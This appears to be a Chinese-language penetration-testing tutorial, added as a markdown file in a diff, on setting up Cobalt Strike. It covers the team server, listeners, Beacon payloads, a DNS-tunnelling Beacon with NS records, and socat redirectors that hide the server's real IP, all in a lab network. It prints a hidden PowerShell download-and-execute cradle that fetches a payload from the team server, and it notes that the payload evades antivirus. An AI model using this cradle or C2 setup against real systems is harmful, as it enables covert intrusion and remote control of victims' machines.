@@ -1,0 +1,368 @@
+![202110291721693.png](https://image.3001.net/images/20211129/1638171845_61a484c5811cc1347b6f0.png!small)
+
+![image-20211129141203360](https://image.3001.net/images/20211129/1638171847_61a484c7aeea81e7843d7.png!small)Cobalt
+Strike是一款综合的渗透测试神器
+
+> 官网：https://www.cobaltstrike.com/
+>
+> 工具的社区版是Armitage(一个MSF的图形化界面工具)，CobaltStrike为收费商业版本
+>
+>
+> 手册：[CobaltStrike4.0用户手册_中文翻译](https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf)、[4.3](https://www.ddosi.org/csmanual43/)、[狼组版](https://wiki.wgpsec.org/knowledge/intranet/Cobalt-> Strike.html)
+
+Cobalt Strike使用C/S架构，Cobalt Strike的客户端连接到团队服务器，团队服务器连接到目标，也就是说Cobalt
+Strike的客户端不与目标服务器进行交互
+
+![image-20211128135921350](https://image.3001.net/images/20211129/1638171848_61a484c8e6a846cb3ce1b.png!small)
+
+ **服务器（Team Server）**
+
+  * 生成攻击载荷（payload）
+
+  * 下载攻击代码(会在服务器设置的端口上提供攻击代码下载)
+
+  * 监听器（端口监听）
+
+  * Team Server 日志记录 保存在logs文件夹
+
+  * 支持团队协同操作
+
+  * Cobalt Strike团队服务器只能运行在Linux环境下
+
+ **客户端（Client）**
+
+  * 跨平台、有Java运行环境就可以运行
+
+  * 支持多服务器，可以连接多个服务器
+
+# 基本使用
+
+### 客户端与服务器连接
+
+ **服务器端启动**
+
+    
+    
+    root@kali:~/桌面/CobaltStrike4.1# ./teamserver 192.168.179.128  ocean
+    #  ./teamserver <host> <password> [/path/to/c2.profile] [YYYY-MM-DD]
+    
+
+**客户端连接**
+
+  * Windows
+
+双击 bat 文件，输入IP、密码、用户名（自定义），点击Connect即可
+
+  * Linux
+
+直接运行 start.sh 脚本文件，输入团队服务器的IP、密码和自己的用户名（自定义）进行连接
+
+## 上线CS基本步骤
+
+    
+    
+    # 基本步骤
+    1. 设置监听器（Linster）
+    2. 生成攻击载荷（Payload）
+    3. 目标机器（Victim）运行，上线cs
+    
+
+  1. 设置监听器（Linster）
+
+点击耳机图标配置监听
+
+![image-20211128143814833](https://image.3001.net/images/20211129/1638171849_61a484c98c674b86b290b.png!small)
+
+设置相关属性
+
+![image-20211128144431243](https://image.3001.net/images/20211129/1638171850_61a484ca4bae2c9763cbe.png!small)
+
+  2. 生成攻击载荷（Payload）
+
+攻击->钓鱼攻击->web脚本传递
+
+![image-20211128143540347](https://image.3001.net/images/20211129/1638171850_61a484cad66276fa610cb.png!small)
+
+设置参数，也可以设置payload类型
+
+    
+        在teamserver的80端口生成payload，victim使用powershell加载到内存执行，最终上线
+    
+
+![image-20211128143519841](https://image.3001.net/images/20211129/1638171851_61a484cb94a93ec9ac4ad.png!small)
+
+点击开始生成代码
+
+![image-20211128143559039](https://image.3001.net/images/20211129/1638171852_61a484cc6234402bfb4cb.png!small)
+
+    
+        powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.179.128:80/a'))"
+    
+
+  3. 目标机器（Victim）运行，上线cs
+
+![image-20211128150236685](https://image.3001.net/images/20211129/1638171852_61a484cce71ae06f1aa85.png!small)
+
+在 CS->视图->web日志 中可以看到payload的访问日志
+
+payload还具有免杀效果
+
+![image-20211128144302453](https://image.3001.net/images/20211129/1638171853_61a484cd93ff51e8d4697.png!small)
+
+在可视化中可以切换视图
+
+![image-20211128144739543](https://image.3001.net/images/20211129/1638171854_61a484ce3708e6abb979b.png!small)
+
+这是上线cs的基本步骤，下面来看一下刚才使用到的模块的定义
+
+# 基础设施
+
+任何行动的第一步都是建立基础设施。就 Cobalt Strike 而言，基础设施由一个或多个团队服务器、重定向器以及指向你的团队服务器和重定向器的 DNS
+记录组成。一旦团队服务器启动并运行，你将需要连接到它并将其配置为接收来自受害系统的连接。监听器就是 Cobalt Strike 中用来执行这种任务的机制
+
+## 监听器
+
+监听器的名字一般由以下结构组成：
+
+    
+    
+    Operating System/Payload/Stager
+    
+
+例如：
+
+    
+    
+    windows/beacon_http/reverse_http
+    
+
+在CS客户端中打开 Cobalt Strike —》Listeners，之后点击Add，此时弹出New Listener窗口
+
+Cobalt Strike有两种类型的 **监听器** ：
+
+  1.  **Beacon**
+
+Beacon直译过来就是灯塔、信标、照亮指引的意思，Beacon是较为隐蔽的后渗透代理，个人理解Beacon类型的监听器应该是平时比较常用的。Beacon监听器的名称例如
+
+    
+        windows/beacon_http/reverse_http
+    
+
+  2. **Foreign**
+
+Foreign直译就是外部的，这里可以理解成`对外监听器`，这种类型的监听器主要作用是给其他的Payload提供别名，比如Metasploit
+框架里的Payload，个人理解Foreign监听器在一定程度上提高了CS的兼容性。对外监听器的名称例如：
+
+    
+        windows/foreign/reverse_https
+    
+
+### Beacon
+
+ **Beacon是什么**
+
+  * Beacon是CS的Payload
+
+  * Beacon有两种通信模式。一种是异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任务、然后休眠；另一种是交互式通信模式，这种模式的通信是实时发生的。
+
+  * 通过HTTP、HTTPS和DNS出口网络
+
+  * 使用SMB协议的时候是点对点通信
+
+  * Beacon有很多的后渗透攻击模块和远程管理工具
+
+ **Beacon的类型**
+
+  * HTTP 和 HTTPS Beacon
+
+HTTP和HTTPS Beacon也可以叫做Web Beacon。默认设置情况下，HTTP 和 HTTPS Beacon 通过 HTTP GET
+请求来下载任务。这些 Beacon 通过 HTTP POST 请求传回数据
+
+    
+        windows/beacon_http/reverse_http
+    windows/beacon_https/reverse_https
+    
+
+  * DNS Beacon
+    
+        windows/beacon_dns/reverse_dns_txt
+    windows/beacon_dns/reverse_http
+    
+
+  * SMB Beacon
+
+SMB Beacon也可以叫做pipe beacon
+
+    
+        windows/beacon_smb/bind_pipe
+    
+
+### DNS Beacon
+
+DNS Beacon，顾名思义就是使用DNS请求将Beacon返回。这些 DNS 请求用于解析由你的 CS 团队服务器作为权威 DNS 服务器的域名。DNS
+响应告诉 Beacon 休眠或是连接到团队服务器来下载任务。DNS 响应也告诉 Beacon 如何从你的团队服务器下载任务
+
+在CS 4.0及之后的版本中，DNS Beacon是一个仅DNS的Payload，在这个Payload中没有HTTP通信模式，这是与之前不同的地方
+
+优点：木马隐蔽性好，受害者不开放任何端口，可以规避防火墙，走53端口
+
+缺点：响应速度慢
+
+#### DNS请求
+
+在开始DNSBeacon实验之前先了解下DNS请求原理
+
+> [DNS请求原理](https://zhuanlan.zhihu.com/p/79350395)
+
+一个DNS请求大概流程：
+
+浏览器的dns缓存->本地host文件->DNS服务器->根DNS服务器
+
+  * 记录类型
+
+标识域名对应何种类型的记录。类型为A,表示域名对应的IP地址。类型为MX时,表示域名对应的是邮件服务器。类型为PTR,表示根据IP地址反查域名。类型为CNAME,表示查询域名相关别名
+
+  * NS 记录
+
+NS 代表“域名服务器”，域名服务器记录指示哪个 [DNS](https://www.cloudflare.com/learning/dns/what-is-dns/)服务器对该[域](https://www.cloudflare.com/learning/dns/glossary/what-is-a-domain-name/)具有权威性（即，哪个服务器包含实际 [DNS
+记录](https://www.cloudflare.com/learning/dns/dns-records/)）。基本上，NS
+记录告诉互联网可从哪里找到域的 [IP 地址](https://www.cloudflare.com/learning/dns/glossary/what-is-my-ip-address/)。一个域通常会有多个 NS 记录，这些记录可指示该域的主要和备用域名服务器。倘若没有正确配置的 NS
+记录，用户将无法加载网站或应用程序
+
+#### 原理
+
+原本DNS Beacon可以使用两种方式进行传输，一种是使用HTTP来下载Payload（无阶段的Stageless），一种是使用DNS
+TXT记录来下载Payload（带阶段下载的Stager），不过现在4.0版本中，已经没有了HTTP方式，CS4.0以及未来版本都只有DNS
+TXT记录这一种选择了
+
+![image-20211129142733497](https://image.3001.net/images/20211129/1638171855_61a484cf0a0327d7bdbd3.png!small)
+
+当我们给CS的teamserver搞了一个域名并配置相应的A记录以及指向自身A记录的NS记录后，DNS请求就会被迭代查询的本地DNS服务器一步一步引向teamserver，teamserver收到了服务端的特殊DNS请求后便可以用封装的加密通信协议与之交互了
+
+#### 实验
+
+首先需要配置域名，如果有自己申请的域名可以直接使用，没有的话需要在内网搭建DNS服务器
+
+以域名 ocean.cn 为例
+
+  1. 用一台公网的 的 Linux 系统的云服务器作为 C&C 服务器需要在安全组中放行50050端口和53端口
+    
+        ./teamserver ip password
+    
+
+  2. 添加一条A记录指向CS服务器的公网IP
+
+![image-20211129140212729](https://image.3001.net/images/20211129/1638171856_61a484d02497c65720ce1.png!small)
+
+  3. 添加NS(name server)记录，,主机记录可以是dns,记录值是cs.ocean.cn,NS记录就是将解析任务交由一个指定的"权威"dns服务器(在这里teamserver就是我们的"权威"dns)，可以多添加几条
+
+![image-20211129141432631](https://image.3001.net/images/20211129/1638171856_61a484d08f1b424c30e2b.png!small)
+
+  4. 创建监听器，payload选择Beacon DNS（我用版本是4.1只有这一个），DNS Hosts填写NS记录和A记录对应的名称，DNS Host填写A记录对应的名称
+
+![image-20211129145911389](https://image.3001.net/images/20211129/1638171857_61a484d1439ed012c45c1.png!small)
+
+  5. 生成payload，注意80端口需要在安全组中打开且未被占用
+
+![image-20211129142327127](https://image.3001.net/images/20211129/1638171857_61a484d1b4d8328ca0918.png!small)
+
+  6. victim执行之后，web日志中可以看到访问日志，需要等待一段时间才会上线
+
+![image-20211129143111084](https://image.3001.net/images/20211129/1638171858_61a484d2472d1ad725f48.png!small)
+
+默认情况下，主机信息是黑色的
+
+![image-20211129144448764](https://image.3001.net/images/20211129/1638171858_61a484d2c928fa742b0f8.png!small)
+
+需要执行以下命令(或者执行任意操作如：屏幕截图)，让目标主机信息显示出来
+
+    
+        checkin
+    mode dns-txt
+    
+
+由于DNS数据包的来源是代理查询的DNS服务器并不是被控机器的真实出口IP，因此这里不会显示external的IP地址
+
+ **攻击流程**
+
+根据之前的记录值，整个流程就是当请求data.dns.ocean.com的时候有cs.ocean.cn负责解析，然后cs.ocean.cn记录本身又有A记录存在对应的IP地址，teamserver中配置了dns
+listener（cs中listener的dns hosts设置为dns.ocean.cn），之后就可以很teamserver进行通信
+
+#### 避坑
+
+大多数网上的文章，在配置监听器时都是用DNS Hosts填写NS记录和A记录对应的名称，DNS Host填写A记录对应的名称，即下图这种情况
+
+![image-20211129145306276](https://image.3001.net/images/20211129/1638171859_61a484d39e111f309cb7d.png!small)
+
+这样配置的话，上线确实可以，但成功上线的类型是beacon(stageless)，CS4中的DNS
+Beacon才是真正纯粹的DNS隧道，前作中大家常用的方式都是以http的形式传递，没有起到dns真正的作用
+
+正确应该是全部为NS解析记录
+
+具体原因可以看这篇文章：https://xz.aliyun.com/t/7938
+
+推荐阅读：https://paper.seebug.org/1568/
+
+## 重定器
+
+重定向器`Redirectors`是一个位于CS团队服务器和目标网络之间的服务器，这个重定向器通俗的来说就是一个代理工具，或者说端口转发工具，担任CS服务器与目标服务器之间的跳板机角色，整体流量就像下面这样
+
+    
+    
+    目标靶机 <-------->多个并列的重定向器<------>CS服务器
+    
+
+重定向器在平时的攻击或者防御的过程中起到很重要的作用，主要有以下两点：
+
+  * 保护自己的CS服务器，避免目标发现自己的真实IP
+
+  * 提高整体可靠性，因为可以设置多个重定向器，因此如果有个别重定向器停止工作了，整体上系统依旧是可以正常工作的
+
+通常使用Socat工具作为CS的重定向器
+
+### 实验
+
+实验使用内网环境
+
+  * CS服务器IP：192.168.179.128
+
+  * 目标靶机IP：192.168.179.148
+
+  * 重定向器IP：192.168.179.147、192.168.179.141
+
+也可以添加一个DNS服务器模拟真实环境，真实渗透中IP全部为公网IP（当然hacker可以为局域网IP），以下为拓扑结构，忽略了网络路由细节
+
+![image-20211128153457430](https://image.3001.net/images/20211129/1638171860_61a484d47afe8babbcdf3.png!small)
+
+ **配置重定向器**
+
+首先需要配置重定向器的端口转发，比如使用HTTP
+Beacon，在重定向器服务器上使用以下命令将重定向器的8011端口转发至TeamServer的8011端口
+
+    
+    
+    socat TCP4-:LISTEN:8011,fork TCP4:[TeanServer IP:Port]
+    # 在实验环境中就是
+    socat TCP4-LISTEN:8011,fork TCP4:192.168.179.128:8011
+    # 没有socat就用
+    apt-get install socat
+    
+
+![image-20211128161823023](https://image.3001.net/images/20211129/1638171861_61a484d5500efdd0ff25e.png!small)
+
+新建监听器
+
+![image-20211128164151107](https://image.3001.net/images/20211129/1638171861_61a484d5d2e5b351cfe53.png!small)
+
+把这两个重定向器都添加到http hosts中
+
+生成攻击payload（上线机器是执行后的效果）
+
+![image-20211128165405065](https://image.3001.net/images/20211129/1638171862_61a484d69d114e1fc6abf.png!small)
+
+web日志
+
+![image-20211128170231526](https://image.3001.net/images/20211129/1638171863_61a484d761924171aea91.png!small)
+
+通过可以看到ExteralIP和web日志可以看出来两个重定向器已经生效
+
